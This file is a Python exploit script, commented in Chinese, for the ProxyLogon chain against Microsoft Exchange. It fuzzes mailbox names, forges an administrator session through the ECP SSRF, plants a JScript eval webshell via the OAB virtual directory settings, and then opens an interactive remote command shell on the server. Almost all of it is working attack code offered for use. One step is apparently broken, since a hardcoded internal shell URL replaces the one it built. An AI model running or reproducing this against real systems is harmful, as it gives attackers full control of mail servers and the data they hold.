# -*- coding: utf-8 -*-
import requests
from urllib3.exceptions import InsecureRequestWarning
import random
import string
import argparse
import sys
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


fuzz_email = ['administrator', 'webmaste', 'support', 'sales', 'contact', 'admin', 'test',
              'test2', 'test01', 'test1', 'guest', 'sysadmin', 'info', 'noreply', 'log', 'no-reply']

proxies = {}
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"

shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\test11.aspx"
shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path
# webshell-马子内容
shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["code"],"unsafe");}</script>'

final_shell = ""

def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))




if __name__=="__main__":
    parser = argparse.ArgumentParser(
        description='Example: python exp.py -u 127.0.0.1 -user administrator -suffix @ex.com\n如果不清楚用户名，可不填写-user参数，将自动Fuzz用户名。')
    parser.add_argument('-u', type=str,
                        help='target')
    parser.add_argument('-user',
                        help='exist email', default='')
    parser.add_argument('-suffix',
                        help='email suffix')
    args = parser.parse_args()
    target = args.u
    suffix = args.suffix
    if suffix == "":
        print("请输入suffix")

    exist_email = args.user
    if exist_email:
        fuzz_email.insert(0, exist_email)
    random_name = id_generator(4) + ".js"
    print("目标 Exchange Server: " + target)

    for i in fuzz_email:
        new_email = i+suffix
        autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
""" % new_email
        # print("get FQDN")
        FQDN = "EXCHANGE01"
        ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={"Cookie": "X-BEResource=localhost~1942062522",
                                                                            "User-Agent": user_agent},
                      verify=False, proxies=proxies)

        if "X-CalculatedBETarget" in ct.headers and "X-FEServer" in ct.headers:
            FQDN = ct.headers["X-FEServer"]
            print("got FQDN:" + FQDN)

        ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
            "Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;" % FQDN,
            "Content-Type": "text/xml",
            "User-Agent": user_agent},
            data=autoDiscoverBody,
            proxies=proxies,
            verify=False
        )

        if ct.status_code != 200:
            print(ct.status_code)
            print("Autodiscover Error!")

        if "<LegacyDN>" not in str(ct.content):
            print("Can not get LegacyDN!")
        try:
            legacyDn = str(ct.content).split("<LegacyDN>")[
                1].split(r"</LegacyDN>")[0]
            print("Got DN: " + legacyDn)

            mapi_body = legacyDn + \
                "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

            ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                "Cookie": "X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&a=~1942062522;" % FQDN,
                "Content-Type": "application/mapi-http",
                "X-Requesttype": "Connect",
                "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
                "X-Clientapplication": "Outlook/15.0.4815.1002",
                "X-Requestid": "{E2EA6C1C-E61B-49E9-9CFB-38184F907552}:123456",
                "User-Agent": user_agent
            },
                data=mapi_body,
                verify=False,
                proxies=proxies
            )
            if ct.status_code != 200 or "act as owner of a UserMailbox" not in str(ct.content):
                print("Mapi Error!")
                exit()

            sid = str(ct.content).split("with SID ")[
                1].split(" and MasterAccountSid")[0]

            print("Got SID: " + sid)
            sid = sid.replace(sid.split("-")[-1], "500")

            proxyLogon_request = """<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>
            """ % sid

            ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                "Cookie": "X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % FQDN,
                "Content-Type": "text/xml",
                "msExchLogonMailbox": "S-1-5-20",
                "User-Agent": user_agent
            },
                data=proxyLogon_request,
                proxies=proxies,
                verify=False
            )
            if ct.status_code != 241 or not "set-cookie" in ct.headers:
                print("Proxylogon Error!")
                exit()

            sess_id = ct.headers['set-cookie'].split(
                "ASP.NET_SessionId=")[1].split(";")[0]

            msExchEcpCanary = ct.headers['set-cookie'].split("msExchEcpCanary=")[
                1].split(";")[0]
            print("Got session id: " + sess_id)
            print("Got canary: " + msExchEcpCanary)

            ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                # "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                # FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),

                "Cookie": "X-BEResource=Admin@{server_name}:444/ecp/DDI/DDIService.svc/GetList?reqId=1615583487987&schema=VirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={sess_id}; msExchEcpCanary={msExchEcpCanary1}".
                            format(server_name=FQDN, msExchEcpCanary1=msExchEcpCanary, sess_id=sess_id,
                                    msExchEcpCanary=msExchEcpCanary),
                            "Content-Type": "application/json; charset=utf-8",
                            "msExchLogonMailbox": "S-1-5-20",
                            "User-Agent": user_agent

                            },
                            json={"filter": {
                                "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                                "SelectedView": "", "SelectedVDirType": "OAB"}}, "sort": {}},
                            verify=False,
                            proxies=proxies
                            )

            if ct.status_code != 200:
                print("GetOAB Error!")
                exit()
            oabId = str(ct.content).split('"RawIdentity":"')[1].split('"')[0]
            print("Got OAB id: " + oabId)

            oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
                        "properties": {
                            "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                        "ExternalUrl": "http://ffff/#%s" % shell_content}}}

            ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                    FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
                "msExchLogonMailbox": "S-1-5-20",
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": user_agent
            },
                json=oab_json,
                proxies=proxies,
                verify=False
            )
            if ct.status_code != 200:
                print("Set external url Error!")
                exit()

            reset_oab_body = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
                            "properties": {
                                "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                                "FilePathName": shell_absolute_path}}}

            ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                    FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
                "msExchLogonMailbox": "S-1-5-20",
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": user_agent
            },
                json=reset_oab_body,
                proxies=proxies,
                verify=False
            )

            if ct.status_code != 200:
                print("写入shell失败")
                exit()
            #shell_url = "https://"+target+"/owa/auth/test11.aspx"  
            shell_url = "https://"+target+"/aspnet_client/test11.aspx"
            print("成功写入shell：" + shell_url)
            print("下面验证shell是否ok")
            print('code=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami").StdOut.ReadAll());')
            print("正在请求shell")
            import time
            time.sleep(1)
            shell_url = "https://192.168.111.50/aspnet_client/YhaNjklsGO.aspx"
            data = requests.post(shell_url, data={
                                "code": "Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"whoami\").StdOut.ReadAll());"}, verify=False, proxies=proxies)
            if data.status_code != 200:
                print("写入shell失败")
            else:
                print("shell:"+data.text.split("OAB (Default Web Site)")
                    [0].replace("Name                            : ", ""))
                print('[+]用户名: '+ new_email)
                final_shell = shell_url
                break
        except:
            print('[-]用户名: '+new_email)
            print("=============================")
    if not final_shell:
        sys.exit()
    print("下面启用交互式shell")
    while True:
        input_cmd = input("[#] command: ")
        data={"code": """Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall())""" % input_cmd}
        ct = requests.post(
            final_shell,
            data=data,verify=False, proxies=proxies)
        if ct.status_code != 200 or "OAB (Default Web Site)" not in ct.text:
            print("[*] Failed to execute shell command")
        else:
            shell_response = ct.text.split(
                "Name                            :")[0]
            print(shell_response)
